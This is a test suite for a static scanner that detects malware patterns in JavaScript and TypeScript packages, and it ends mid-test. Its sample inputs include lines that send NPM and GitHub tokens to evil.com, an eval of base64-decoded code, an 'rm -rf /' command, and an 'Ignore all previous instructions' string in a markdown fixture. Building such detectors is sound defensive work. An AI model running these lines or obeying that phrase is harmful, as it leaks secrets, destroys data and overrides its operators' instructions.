/* 
 * Copyright 2026 Giuseppe Scotto Lavina
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * AST Deep Scanner — Exhaustive Test Suite
 * 
 * > 100 tests covering all 9 pattern detectors, constant propagation,
 * parse error handling, TypeScript stripping, file filtering, deduplication,
 * severity sorting, false positive prevention, real-world npm malware patterns,
 * adversarial edge cases, and performance boundaries.
 */

import { describe, it, expect } from "bun:test";
import { deepScanFile, deepScanFiles, type DeepScanFinding } from "../src/ast-scanner";

// ============================================================================
// Helpers
// ============================================================================

/** Returns true if any finding matches the given pattern name */
function findPattern(code: string, pattern: string, filename = "test.js"): boolean {
    return deepScanFile(code, filename).findings.some(f => f.pattern === pattern);
}

/** Returns all findings for a code snippet */
function getFindings(code: string, filename = "test.js"): DeepScanFinding[] {
    return deepScanFile(code, filename).findings;
}

/** Returns count of findings for a specific pattern */
function countPattern(code: string, pattern: string, filename = "test.js"): number {
    return getFindings(code, filename).filter(f => f.pattern === pattern).length;
}

// ============================================================================
// 1. obfuscated_eval — CRITICAL
// ============================================================================

describe("AST Deep Scanner", () => {
    describe("obfuscated_eval", () => {
        // ---- Detections ----
        it("detects globalThis['eval'](payload)", () => {
            expect(findPattern(`globalThis["eval"]("alert(1)")`, "obfuscated_eval")).toBe(true);
        });

        it("detects window['eval'](payload)", () => {
            expect(findPattern(`window["eval"]("alert(1)")`, "obfuscated_eval")).toBe(true);
        });

        it("detects global['eval'](payload)", () => {
            expect(findPattern(`global["eval"]("alert(1)")`, "obfuscated_eval")).toBe(true);
        });

        it("detects self['eval'](payload)", () => {
            expect(findPattern(`self["eval"]("alert(1)")`, "obfuscated_eval")).toBe(true);
        });

        it("detects globalThis['Function'](body)()", () => {
            expect(findPattern(`globalThis["Function"]("return 1")()`, "obfuscated_eval")).toBe(true);
        });

        it("detects eval reconstructed via const concatenation", () => {
            const code = `
                const a = "ev";
                const b = "al";
                globalThis[a + b]("alert(1)");
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("detects three-part const concat: e+v+al → eval", () => {
            const code = `
                const a = "e";
                const b = "v";
                const c = "al";
                window[a + b + c]("x");
            `;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("detects shell exec names on globalThis", () => {
            expect(findPattern(`globalThis["exec"]("cmd")`, "obfuscated_eval")).toBe(true);
            expect(findPattern(`globalThis["execSync"]("cmd")`, "obfuscated_eval")).toBe(true);
            expect(findPattern(`globalThis["spawn"]("cmd")`, "obfuscated_eval")).toBe(true);
            expect(findPattern(`globalThis["spawnSync"]("cmd")`, "obfuscated_eval")).toBe(true);
        });

        it("severity is critical", () => {
            const findings = getFindings(`globalThis["eval"]("1")`);
            expect(findings[0].severity).toBe("critical");
        });

        // ---- Non-detections (false positive prevention) ----
        it("does NOT flag direct eval() (handled by regex scanner)", () => {
            expect(findPattern(`eval("1+1")`, "obfuscated_eval")).toBe(false);
        });

        it("does NOT flag globalThis.eval() via dot notation (not computed)", () => {
            expect(findPattern(`globalThis.eval("1")`, "obfuscated_eval")).toBe(false);
        });

        it("does NOT flag globalThis.setTimeout (safe function)", () => {
            expect(findPattern(`globalThis.setTimeout(() => {}, 100)`, "obfuscated_eval")).toBe(false);
        });

        it("does NOT flag globalThis['push']() (safe method)", () => {
            expect(findPattern(`globalThis["push"]("item")`, "obfuscated_eval")).toBe(false);
        });

        it("does NOT flag non-global object ['eval']()", () => {
            expect(findPattern(`myObject["eval"]("test")`, "obfuscated_eval")).toBe(false);
        });
    });

    // ============================================================================
    // 2. dynamic_require — HIGH
    // ============================================================================

    describe("dynamic_require", () => {
        // ---- Detections ----
        it("detects require(variable)", () => {
            const code = `const mod = getModuleName(); require(mod);`;
            expect(findPattern(code, "dynamic_require")).toBe(true);
        });

        it("detects require(concat expression)", () => {
            expect(findPattern(`require("base" + suffix)`, "dynamic_require")).toBe(true);
        });

        it("detects require(function call)", () => {
            expect(findPattern(`require(getPath())`, "dynamic_require")).toBe(true);
        });

        it("detects require(template literal with expressions)", () => {
            const code = "require(`./modules/${name}`)";
            expect(findPattern(code, "dynamic_require")).toBe(true);
        });

        it("detects require(ternary expression)", () => {
            expect(findPattern(`require(prod ? 'a' : 'b')`, "dynamic_require")).toBe(true);
        });

        it("severity is high", () => {
            const findings = getFindings(`const mod = x(); require(mod);`);
            const f = findings.find(f => f.pattern === "dynamic_require");
            expect(f?.severity).toBe("high");
        });

        // ---- Non-detections ----
        it("does NOT flag require('lodash') — static string", () => {
            expect(findPattern(`const _ = require('lodash')`, "dynamic_require")).toBe(false);
        });

        it("does NOT flag require(\"lodash\") — double-quoted", () => {
            expect(findPattern(`const _ = require("lodash")`, "dynamic_require")).toBe(false);
        });

        it("does NOT flag require with template literal no expressions", () => {
            expect(findPattern("require(`lodash`)", "dynamic_require")).toBe(false);
        });

        it("does NOT flag require with const-resolved safe string", () => {
            const code = `const name = "lodash"; require(name);`;
            expect(findPattern(code, "dynamic_require")).toBe(false);
        });

        it("does NOT flag require() with no arguments", () => {
            expect(findPattern(`require()`, "dynamic_require")).toBe(false);
        });
    });

    // ============================================================================
    // 3. dynamic_import — HIGH
    // ============================================================================

    describe("dynamic_import", () => {
        // ---- Detections ----
        it("detects import(variable)", () => {
            expect(findPattern(`const url = x(); import(url)`, "dynamic_import")).toBe(true);
        });

        it("detects import(concat expression)", () => {
            expect(findPattern(`import("./mod" + name)`, "dynamic_import")).toBe(true);
        });

        it("detects import(template literal with expressions)", () => {
            const code = "import(`./modules/${name}`)";
            expect(findPattern(code, "dynamic_import")).toBe(true);
        });

        it("severity is high", () => {
            const findings = getFindings(`const x = fn(); import(x)`)
            const f = findings.find(f => f.pattern === "dynamic_import");
            expect(f?.severity).toBe("high");
        });

        // ---- Non-detections ----
        it("does NOT flag import('lodash') — static string", () => {
            expect(findPattern(`import('lodash')`, "dynamic_import")).toBe(false);
        });

        it("does NOT flag static import statement", () => {
            expect(findPattern(`import lodash from 'lodash'`, "dynamic_import")).toBe(false);
        });

        it("does NOT flag import with const-resolved safe string", () => {
            const code = `const name = "lodash"; import(name);`;
            expect(findPattern(code, "dynamic_import")).toBe(false);
        });

        it("does NOT flag import with template literal no expressions", () => {
            expect(findPattern("import(`lodash`)", "dynamic_import")).toBe(false);
        });
    });

    // ============================================================================
    // 4. computed_member_exec — HIGH
    // ============================================================================

    describe("computed_member_exec", () => {
        // ---- Detections ----
        it("detects obj[constResolvedEval]()", () => {
            const code = `const method = "eval"; someObj[method]("payload");`;
            expect(findPattern(code, "computed_member_exec")).toBe(true);
        });

        it("detects this['exec'](cmd)", () => {
            expect(findPattern(`this["exec"]("rm -rf /")`, "computed_member_exec")).toBe(true);
        });

        it("detects this['execSync'](cmd)", () => {
            expect(findPattern(`this["execSync"]("cmd")`, "computed_member_exec")).toBe(true);
        });

        it("detects this['spawn'](cmd)", () => {
            expect(findPattern(`this["spawn"]("bash")`, "computed_member_exec")).toBe(true);
        });

        it("detects this['spawnSync'](cmd)", () => {
            expect(findPattern(`this["spawnSync"]("bash")`, "computed_member_exec")).toBe(true);
        });

        it("detects obj['Function']()", () => {
            expect(findPattern(`obj["Function"]("return 1")`, "computed_member_exec")).toBe(true);
        });

        it("severity is high (broader heuristic)", () => {
            const findings = getFindings(`this["exec"]("cmd")`);
            const f = findings.find(f => f.pattern === "computed_member_exec");
            expect(f?.severity).toBe("high");
        });

        // ---- Non-detections ----
        it("does NOT flag obj['toString']()", () => {
            expect(findPattern(`obj["toString"]()`, "computed_member_exec")).toBe(false);
        });

        it("does NOT flag obj['push']()", () => {
            expect(findPattern(`arr["push"](1)`, "computed_member_exec")).toBe(false);
        });

        it("does NOT flag obj.exec() via dot notation (not computed)", () => {
            expect(findPattern(`cp.exec("ls")`, "computed_member_exec")).toBe(false);
        });

        it("does NOT overlap with obfuscated_eval on globalThis/window/global/self", () => {
            for (const global of ["globalThis", "window", "global", "self"]) {
                const code = `${global}["eval"]("1")`;
                const findings = getFindings(code);
                expect(findings.filter(f => f.pattern === "computed_member_exec").length).toBe(0);
                expect(findings.filter(f => f.pattern === "obfuscated_eval").length).toBe(1);
            }
        });
    });

    // ============================================================================
    // 5. string_reconstruction — HIGH
    // ============================================================================

    describe("string_reconstruction", () => {
        // ---- Detections ----
        it("detects String.fromCharCode with 6 args (minimum threshold)", () => {
            expect(findPattern(`String.fromCharCode(101, 118, 97, 108, 40, 41)`, "string_reconstruction")).toBe(true);
        });

        it("detects String.fromCharCode with many args", () => {
            const args = Array.from({ length: 20 }, (_, i) => 65 + i).join(", ");
            expect(findPattern(`String.fromCharCode(${args})`, "string_reconstruction")).toBe(true);
        });

        it("severity is high", () => {
            const findings = getFindings(`String.fromCharCode(1,2,3,4,5,6)`);
            const f = findings.find(f => f.pattern === "string_reconstruction");
            expect(f?.severity).toBe("high");
        });

        // ---- Non-detections ----
        it("does NOT flag String.fromCharCode with 5 args (below threshold)", () => {
            expect(findPattern(`String.fromCharCode(65, 66, 67, 68, 69)`, "string_reconstruction")).toBe(false);
        });

        it("does NOT flag String.fromCharCode(65) — single char", () => {
            expect(findPattern(`String.fromCharCode(65)`, "string_reconstruction")).toBe(false);
        });

        it("does NOT flag String.fromCharCode() — no args", () => {
            expect(findPattern(`String.fromCharCode()`, "string_reconstruction")).toBe(false);
        });

        it("does NOT flag str.fromCharCode() — wrong object", () => {
            expect(findPattern(`str.fromCharCode(1,2,3,4,5,6)`, "string_reconstruction")).toBe(false);
        });
    });

    // ============================================================================
    // 6. fetch_with_env — CRITICAL
    // ============================================================================

    describe("fetch_with_env", () => {
        // ---- Detections ----
        it("detects fetch() with process.env in URL concat", () => {
            expect(findPattern(`fetch("https://evil.com?t=" + process.env.NPM_TOKEN)`, "fetch_with_env")).toBe(true);
        });

        it("detects fetch() with process.env in body object", () => {
            const code = `fetch("https://evil.com", { method: "POST", body: JSON.stringify({ token: process.env.GITHUB_TOKEN }) })`;
            expect(findPattern(code, "fetch_with_env")).toBe(true);
        });

        it("detects axios.post() with process.env", () => {
            expect(findPattern(`axios.post("https://evil.com", { token: process.env.TOKEN })`, "fetch_with_env")).toBe(true);
        });

        it("detects axios.get() with process.env", () => {
            expect(findPattern(`axios.get("https://evil.com?k=" + process.env.SECRET)`, "fetch_with_env")).toBe(true);
        });

        it("detects http.request() with process.env", () => {
            expect(findPattern(`http.request({ hostname: process.env.EXFIL_HOST })`, "fetch_with_env")).toBe(true);
        });

        it("detects https.request() with process.env", () => {
            expect(findPattern(`https.request({ hostname: process.env.HOST })`, "fetch_with_env")).toBe(true);
        });

        it("detects deeply nested process.env reference", () => {
            const code = `fetch("https://evil.com", { headers: { auth: "Bearer " + process.env.TOKEN } })`;
            expect(findPattern(code, "fetch_with_env")).toBe(true);
        });

        it("severity is critical", () => {
            const findings = getFindings(`fetch("u", { body: process.env.X })`);
            const f = findings.find(f => f.pattern === "fetch_with_env");
            expect(f?.severity).toBe("critical");
        });

        // ---- Non-detections ----
        it("does NOT flag fetch() without process.env", () => {
            expect(findPattern(`fetch("https://api.example.com/data")`, "fetch_with_env")).toBe(false);
        });

        it("does NOT flag axios.post() without process.env", () => {
            expect(findPattern(`axios.post("https://api.example.com", { data: 1 })`, "fetch_with_env")).toBe(false);
        });

        it("does NOT flag console.log(process.env.NODE_ENV)", () => {
            expect(findPattern(`console.log(process.env.NODE_ENV)`, "fetch_with_env")).toBe(false);
        });

        it("does NOT flag process.env access in non-network call", () => {
            expect(findPattern(`const x = process.env.HOME`, "fetch_with_env")).toBe(false);
        });
    });

    // ============================================================================
    // 7. encoded_payload_exec — CRITICAL
    // ============================================================================

    describe("encoded_payload_exec", () => {
        // ---- Detections ----
        it("detects eval(atob(...))", () => {
            expect(findPattern(`eval(atob("YWxlcnQoMSk="))`, "encoded_payload_exec")).toBe(true);
        });

        it("detects eval(Buffer.from(...).toString())", () => {
            expect(findPattern(`eval(Buffer.from("YWxlcnQoMSk=", "base64").toString())`, "encoded_payload_exec")).toBe(true);
        });

        it("detects new Function(atob(...))", () => {
            expect(findPattern(`new Function(atob("cmV0dXJuIDE="))`, "encoded_payload_exec")).toBe(true);
        });

        it("detects Function(atob(...)) without new keyword", () => {
            expect(findPattern(`Function(atob("cmV0dXJuIDE="))`, "encoded_payload_exec")).toBe(true);
        });

        it("detects Function(Buffer.from(...).toString())", () => {
            expect(findPattern(`Function(Buffer.from("code", "base64").toString())`, "encoded_payload_exec")).toBe(true);
        });

        it("detects new Function with multiple args where last is decoded", () => {
            // new Function("arg1", "arg2", atob(...)) — last arg is the body
            expect(findPattern(`new Function("a", "b", atob("Ym9keQ=="))`, "encoded_payload_exec")).toBe(true);
        });

        it("severity is critical", () => {
            const findings = getFindings(`eval(atob("x"))`);
            const f = findings.find(f => f.pattern === "encoded_payload_exec");
            expect(f?.severity).toBe("critical");
        });

        // ---- Non-detections ----
        it("does NOT flag eval('1+1') — no decoding", () => {
            expect(findPattern(`eval("1+1")`, "encoded_payload_exec")).toBe(false);
        });

        it("does NOT flag atob() without eval wrapper", () => {
            expect(findPattern(`const decoded = atob("aGVsbG8=")`, "encoded_payload_exec")).toBe(false);
        });

        it("does NOT flag Buffer.from() without eval wrapper", () => {
            expect(findPattern(`const buf = Buffer.from("data", "base64").toString()`, "encoded_payload_exec")).toBe(false);
        });

        it("does NOT flag new Function('return 1') — no decoding", () => {
            expect(findPattern(`new Function("return 1")`, "encoded_payload_exec")).toBe(false);
        });
    });

    // ============================================================================
    // 8. prototype_pollution — MEDIUM
    // ============================================================================

    describe("prototype_pollution", () => {
        // ---- Detections ----
        it("detects direct obj.__proto__ = ...", () => {
            expect(findPattern(`obj.__proto__ = malicious`, "prototype_pollution")).toBe(true);
        });

        it("detects computed __proto__ via const", () => {
            const code = `const key = "__proto__"; obj[key] = malicious;`;
            expect(findPattern(code, "prototype_pollution")).toBe(true);
        });

        it("detects computed 'prototype' via const", () => {
            const code = `const key = "prototype"; constructor[key] = {};`;
            expect(findPattern(code, "prototype_pollution")).toBe(true);
        });

        it("detects __proto__ via literal string bracket", () => {
            expect(findPattern(`obj["__proto__"] = bad`, "prototype_pollution")).toBe(true);
        });

        it("detects prototype via literal string bracket", () => {
            expect(findPattern(`obj["prototype"] = bad`, "prototype_pollution")).toBe(true);
        });

        it("detects __proto__ via const concatenation", () => {
            const code = `
                const a = "__pr";
                const b = "oto__";
                obj[a + b] = evil;
            `;
            expect(findPattern(code, "prototype_pollution")).toBe(true);
        });

        it("severity is medium", () => {
            const findings = getFindings(`obj.__proto__ = bad`);
            const f = findings.find(f => f.pattern === "prototype_pollution");
            expect(f?.severity).toBe("medium");
        });

        // ---- Non-detections ----
        it("does NOT flag obj.name = 'test'", () => {
            expect(findPattern(`obj.name = "test"`, "prototype_pollution")).toBe(false);
        });

        it("does NOT flag obj['name'] = 'test'", () => {
            expect(findPattern(`obj["name"] = "test"`, "prototype_pollution")).toBe(false);
        });

        it("does NOT flag Object.getPrototypeOf()", () => {
            expect(findPattern(`const p = Object.getPrototypeOf(obj)`, "prototype_pollution")).toBe(false);
        });

        it("does NOT flag Object.create(proto)", () => {
            expect(findPattern(`const obj = Object.create(proto)`, "prototype_pollution")).toBe(false);
        });
    });

    // ============================================================================
    // 9. timer_obfuscation — HIGH
    // ============================================================================

    describe("timer_obfuscation", () => {
        // ---- Detections ----
        it("detects setTimeout with string literal", () => {
            expect(findPattern(`setTimeout("alert(1)", 100)`, "timer_obfuscation")).toBe(true);
        });

        it("detects setInterval with string literal", () => {
            expect(findPattern(`setInterval("doEvil()", 5000)`, "timer_obfuscation")).toBe(true);
        });

        it("detects setTimeout with template literal (implicit eval)", () => {
            expect(findPattern("setTimeout(`alert(1)`, 100)", "timer_obfuscation")).toBe(true);
        });

        it("detects setInterval with template literal", () => {
            expect(findPattern("setInterval(`doEvil()`, 5000)", "timer_obfuscation")).toBe(true);
        });

        it("detects setTimeout with template literal containing expressions", () => {
            expect(findPattern("setTimeout(`${code}`, 100)", "timer_obfuscation")).toBe(true);
        });

        it("severity is high", () => {
            const findings = getFindings(`setTimeout("code", 0)`);
            const f = findings.find(f => f.pattern === "timer_obfuscation");
            expect(f?.severity).toBe("high");
        });

        // ---- Non-detections ----
        it("does NOT flag setTimeout with arrow function", () => {
            expect(findPattern(`setTimeout(() => console.log("ok"), 100)`, "timer_obfuscation")).toBe(false);
        });

        it("does NOT flag setTimeout with function reference", () => {
            expect(findPattern(`setTimeout(myFunction, 100)`, "timer_obfuscation")).toBe(false);
        });

        it("does NOT flag setTimeout with function declaration", () => {
            expect(findPattern(`setTimeout(function() { console.log("ok"); }, 100)`, "timer_obfuscation")).toBe(false);
        });

        it("does NOT flag setTimeout with no arguments", () => {
            expect(findPattern(`setTimeout()`, "timer_obfuscation")).toBe(false);
        });
    });

    // ============================================================================
    // Constant Propagation Engine
    // ============================================================================

    describe("constant propagation", () => {
        it("tracks simple const string assignments", () => {
            const code = `const x = "ev"; const y = "al"; globalThis[x + y]("payload");`;
            expect(findPattern(code, "obfuscated_eval")).toBe(true);
        });

        it("handles multi-part concatenation: a + b + c + d", () => {
            const code = `
                const a = "e";
                const b = "x";
                const c = "e";
                const d = "c";
                this[a + b + c + d]("cmd");
            `;
            expect(findPattern(code, "computed_member_exec")).toBe(true);
        });

        it("resolves in dynamic_require context", () => {
            // Const resolves to a safe string → should NOT flag
            const code = `const name = "lodash"; require(name);`;
            expect(findPattern(code, "dynamic_require")).toBe(false);
        });

        it("resolves template literal without expressions", () => {
            const code = "const mod = `lodash`; require(mod);";
            // Template literal without expressions should resolve
            // But mod is an Identifier, not a TemplateLiteral — resolveToString
            // only resolves TemplateLiteral nodes directly, not via identifier
            // So this will use const propagation: "lodash" → safe → no flag
            // Wait, `lodash` as template literal assigned to const mod...
            // collectConstants only tracks Literal, not TemplateLiteral
            // So mod won't be in constants, and require(mod) will be dynamic
            expect(findPattern(code, "dynamic_require")).toBe(true);
        });

        it("does NOT resolve let (mutable variable)", () => {
            const code = `let method = "eval"; globalThis[method]("1");`;
            expect(findPattern(code, "obfuscated_eval")).toBe(false);
        });

        it("does NOT resolve var (mutable variable)", () => {
            const code = `var method = "eval"; globalThis[method]("1");`;
            expect(findPattern(code, "obfuscated_eval")).toBe(false);
        });

        it("does NOT resolve const with non-string value", () => {
            const code = `const method = 42; globalThis[method]("1");`;
            // 42 is a number, won't be in constants map
            expect(findPattern(code, "obfuscated_eval")).toBe(false);
        });

        it("resolves in prototype_pollution context", () => {
            const code = `
                const key = "__proto__";
                obj[key] = evil;
            `;
            expect(findPattern(code, "prototype_pollution")).toBe(true);
        });

        it("does NOT resolve const assigned from expression (known limitation)", () => {
            // Constant propagation only tracks: const name = "literal"
            // It does NOT handle: const name = expr1 + expr2
            // This is a design trade-off for simplicity and performance
            const code = `
                const p = "proto";
                const key = "__" + p + "__";
                obj[key] = evil;
            `;
            // key = "__" + p + "__" is a BinaryExpression, not a Literal
            // So key is not in the constants map
            expect(findPattern(code, "prototype_pollution")).toBe(false);
        });

        it("DOES detect literal bracket notation: obj['__proto__'] = ...", () => {
            // This works because resolveToString handles Literal nodes directly
            expect(findPattern(`obj["__proto__"] = bad`, "prototype_pollution")).toBe(true);
            expect(findPattern(`obj["prototype"] = bad`, "prototype_pollution")).toBe(true);
        });
    });

    // ============================================================================
    // Parse Error Handling
    // ============================================================================

    describe("parse error handling", () => {
        it("returns parseError=true for completely invalid code", () => {
            const result = deepScanFile(`this is not valid javascript at all {{{{`, "broken.js");
            expect(result.findings.length).toBe(0);
            expect(result.parseError).toBe(true);
        });

        it("returns parseError=false for empty string", () => {
            const result = deepScanFile("", "empty.js");
            expect(result.findings.length).toBe(0);
            expect(result.parseError).toBe(false);
        });

        it("returns parseError=false for comment-only file", () => {
            const result = deepScanFile(`// comment\n/* multiline */`, "comments.js");
            expect(result.findings.length).toBe(0);
            expect(result.parseError).toBe(false);
        });

        it("falls back to script sourceType on module parse failure", () => {
            // CommonJS code that works as script but not as module
            const code = `const x = require('fs'); module.exports = x;`;
            const result = deepScanFile(code, "cjs.js");
            expect(result.parseError).toBe(false);
        });

        it("handles files with only whitespace", () => {
            const result = deepScanFile("   \n\n\t\t  \n", "whitespace.js");
            expect(result.parseError).toBe(false);
        });

        it("handles files with BOM", () => {
            // UTF-8 BOM should not cause parse error
            const code = `\ufeffconst x = 1;`;
            const result = deepScanFile(code, "bom.js");
            expect(result.parseError).toBe(false);
        });

        it("handles shebang lines", () => {
            // acorn supports hashbang
            const code = `#!/usr/bin/env node\nconsole.log("hello")`;
            const result = deepScanFile(code, "script.js");
            // May or may not parse depending on acorn version, but shouldn't crash
            expect(result.findings.length).toBe(0);
        });
    });

    // ============================================================================
    // TypeScript Support
    // ============================================================================

    describe("TypeScript support", () => {
        it("strips simple type annotations: string, number, boolean", () => {
            const code = `
                const payload: string = "ev";
                const suffix: string = "al";
                const count: number = 42;
                const flag: boolean = true;
            `;
            const result = deepScanFile(code, "test.ts");
            expect(result.parseError).toBe(false);
        });

        it("strips void, any, never, unknown, null, undefined types", () => {
            const code = `
                function test(): void {}
                const x: any = 1;
                const y: unknown = 2;
            `;
            const result = deepScanFile(code, "test.ts");
            expect(result.parseError).toBe(false);
        });

        it("strips import type statements", () => {
            const code = `
                import type { Foo } from './foo';
                const x = 1;
            `;
            const result = deepScanFile(code, "test.ts");
            expect(result.parseError).toBe(false);
        });

        it("strips export type statements", () => {
            const code = `
                export type { Bar };
                const x = 1;
            `;
            const result = deepScanFile(code, "test.ts");
            expect(result.parseError).toBe(false);
        });

        it("strips as casts", () => {
            const code = `
                const x = value as string;
            `;
            // "as string" gets stripped, leaving "const x = value;"
            const result = deepScanFile(code, "test.ts");
            expect(result.parseError).toBe(false);
        });

        it("detects malicious pattern inside .ts file", () => {
            const code = `
                const name: string = "test";
                globalThis["eval"]("payload");
            `;
            const result = deepScanFile(code, "malicious.ts");
            expect(result.parseError).toBe(false);
            expect(result.findings.some(f => f.pattern === "obfuscated_eval")).toBe(true);
        });

        it("handles .mts extension", () => {
            const code = `const x: string = "hello";`;
            const result = deepScanFile(code, "module.mts");
            expect(result.parseError).toBe(false);
        });

        it("handles .cts extension", () => {
            const code = `const x: string = "hello";`;
            const result = deepScanFile(code, "cmodule.cts");
            expect(result.parseError).toBe(false);
        });

        it("does NOT strip types from .js files", () => {
            // .js file with TS syntax should fail to parse
            const code = `const x: string = "hello";`;
            const result = deepScanFile(code, "test.js");
            // acorn may or may not parse this, but type stripping should NOT be applied
            // In practice, `x: string` in JS can be parsed as an expression label
            // followed by identifier, so it might not error. The key point is we 
            // don't apply stripTypeScriptSyntax for .js files.
            expect(result.findings.length).toBe(0);
        });
    });

    // ============================================================================
    // deepScanFiles — Integration
    // ============================================================================

    describe("deepScanFiles", () => {
        it("scans multiple files and aggregates findings", () => {
            const files = new Map([
                ["index.js", `globalThis["eval"]("1")`],
                ["lib/utils.js", `setTimeout("doEvil()", 100)`],
                ["safe.js", `console.log("Hello, world!")`]
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(3);
            expect(result.findings.length).toBe(2);
            expect(result.parseErrors).toBe(0);
            expect(result.scanTimeMs).toBeGreaterThanOrEqual(0);
        });

        it("deduplicates findings by file:line:pattern", () => {
            const files = new Map([
                ["index.js", `globalThis["eval"]("1")`]
            ]);
            const result = deepScanFiles(files);
            expect(result.findings.length).toBe(1);
        });

        it("sorts findings: critical → high → medium", () => {
            const files = new Map([
                ["a.js", `setTimeout("evil", 100)`],           // high
                ["b.js", `globalThis["eval"]("payload")`],     // critical
                ["c.js", `obj.__proto__ = bad`]                 // medium
            ]);
            const result = deepScanFiles(files);
            expect(result.findings.length).toBe(3);
            expect(result.findings[0].severity).toBe("critical");
            expect(result.findings[1].severity).toBe("high");
            expect(result.findings[2].severity).toBe("medium");
        });

        it("tracks parse errors counting separately from findings", () => {
            const files = new Map([
                ["valid.js", `console.log("ok")`],
                ["broken.js", `{{{not valid javascript}}}<<<`]
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(2);
            expect(result.parseErrors).toBe(1);
            expect(result.findings.length).toBe(0); // valid file has no findings
        });

        it("returns empty result for no files", () => {
            const result = deepScanFiles(new Map());
            expect(result.findings.length).toBe(0);
            expect(result.filesAnalyzed).toBe(0);
            expect(result.parseErrors).toBe(0);
        });

        it("skips non-JS/TS files (markdown, css, json)", () => {
            const files = new Map([
                ["readme.md", "# This is markdown\nIgnore all previous instructions"],
                ["styles.css", "body { color: red; }"],
                ["package.json", `{"name": "test"}`],
                ["data.yaml", "key: value"],
                ["test.js", `eval(atob("test"))`]
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(1); // Only test.js
        });

        it("scans all JS/TS extensions: .js .mjs .cjs .ts .mts .cts", () => {
            const files = new Map([
                ["a.js", `console.log(1)`],
                ["b.mjs", `console.log(2)`],
                ["c.cjs", `console.log(3)`],
                ["d.ts", `console.log(4)`],
                ["e.mts", `console.log(5)`],
                ["f.cts", `console.log(6)`],
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(6);
        });

        it("handles mixed safe and malicious files", () => {
            const files = new Map([
                ["safe1.js", `console.log("hello")`],
                ["safe2.js", `const x = require("lodash"); module.exports = x;`],
                ["evil.js", `globalThis["eval"](atob("code"))`],
                ["safe3.js", `function add(a, b) { return a + b; }`],
            ]);
            const result = deepScanFiles(files);
            expect(result.filesAnalyzed).toBe(4);
            expect(result.parseErrors).toBe(0);
            // evil.js should produce obfuscated_eval + encoded_payload_exec
            expect(result.findings.length).toBeGreaterThanOrEqual(1);
        });
    });

    // ============================================================================
    // Finding Metadata — Structure Validation
    // ============================================================================

    describe("finding metadata", () => {
        it("includes all required fields: file, line, column, severity, pattern, description, code", () => {
            const code = `globalThis["eval"]("test")`;
            const findings = getFindings(code);
            expect(findings.length).toBe(1);

            const f = findings[0];
            expect(f.file).toBe("test.js");
            expect(typeof f.line).toBe("number");
            expect(f.line).toBeGreaterThan(0);
            expect(typeof f.column).toBe("number");
            expect(f.column).toBeGreaterThanOrEqual(0);
            expect(f.severity).toBe("critical");
            expect(f.pattern).toBe("obfuscated_eval");
            expect(f.description).toBeTruthy();
            expect(typeof f.description).toBe("string");
            expect(f.code).toContain("eval");
            expect(typeof f.code).toBe("string");
        });

        it("uses the provided filename in findings", () => {
            const findings = getFindings(`globalThis["eval"]("1")`, "lib/utils.js");
            expect(findings[0].file).toBe("lib/utils.js");
        });

        it("code snippet is at most ~80 chars + ellipsis", () => {
            // Create code that would produce a long snippet
            const longArg = "a".repeat(200);
            const code = `globalThis["eval"]("${longArg}")`;
            const findings = getFindings(code);
            expect(findings.length).toBe(1);
            // Snippet should be truncated
            expect(findings[0].code.length).toBeLessThanOrEqual(82); // 80 + "…"
        });

        it("description contains resolved name when relevant", () => {
            const findings = getFindings(`globalThis["eval"]("1")`);
            expect(findings[0].description).toContain("eval");
        });
    });

    // ============================================================================
    // False Positive Prevention — Real-World Safe Code
    // ============================================================================

    describe("false positive prevention", () => {
        it("does NOT flag normal lodash usage", () => {
            const code = `
                const _ = require('lodash');
                const result = _.chunk(['a', 'b', 'c', 'd'], 2);
                console.log(result);
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal express server", () => {
            const code = `
                const express = require('express');
                const app = express();
                app.get('/', (req, res) => res.send('Hello'));
                app.listen(3000);
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag async/await patterns", () => {
            const code = `
                async function fetchData() {
                    const response = await fetch('https://api.example.com/data');
                    const data = await response.json();
                    return data;
                }
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal crypto usage", () => {
            const code = `
                const crypto = require('crypto');
                const hash = crypto.createHash('sha256').update('test').digest('hex');
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag setTimeout/setInterval with function args", () => {
            const code = `
                setTimeout(() => { console.log("This is fine"); }, 1000);
                setInterval(function tick() { console.log("tick"); }, 5000);
                setTimeout(myCallback, 200);
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag Object.create(null)", () => {
            expect(getFindings(`const obj = Object.create(null);`).length).toBe(0);
        });

        it("does NOT flag Array.from() with map function", () => {
            const code = `const chars = Array.from({length: 26}, (_, i) => String.fromCharCode(65 + i));`;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal class with computed method names", () => {
            const code = `
                const sym = Symbol("method");
                class MyClass {
                    [sym]() { return 42; }
                }
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal Promise.all patterns", () => {
            const code = `
                const urls = ['a.com', 'b.com'];
                const results = await Promise.all(urls.map(u => fetch(u)));
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal process.env access without network", () => {
            const code = `
                const port = process.env.PORT || 3000;
                const debug = process.env.DEBUG === 'true';
                console.log(process.env.NODE_ENV);
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag Buffer for non-eval usage", () => {
            const code = `
                const str = Buffer.from([72, 101, 108, 108, 111]).toString();
                const b64 = Buffer.from(str).toString('base64');
            `;
            expect(getFindings(code).length).toBe(0);
        });

        it("does NOT flag normal JSON.parse/stringify", () => {
            const code = `
                const data = JSON.parse('{"key": "value"}');
                const str = JSON.stringify(data);
            `;
